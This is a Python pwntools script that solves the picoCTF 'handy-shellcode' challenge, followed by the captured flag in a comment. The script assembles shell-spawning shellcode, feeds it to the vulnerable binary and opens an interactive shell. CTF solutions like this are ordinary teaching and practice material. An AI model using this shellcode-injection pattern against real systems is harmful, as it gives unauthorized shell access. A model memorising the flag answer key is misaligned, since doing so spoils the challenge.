#!/usr/bin/env python3

from pwn import *

s = process('/problems/handy-shellcode_0_24753fd2c78ac1a60682f0c924b23405/vuln')
s.recvuntil('Enter your shellcode:\n')

shellcode = asm(shellcraft.sh())
payload = shellcode

s.sendline(payload)
s.interactive()

# picoCTF{h4ndY_d4ndY_sh311c0d3_ce07e7f1}
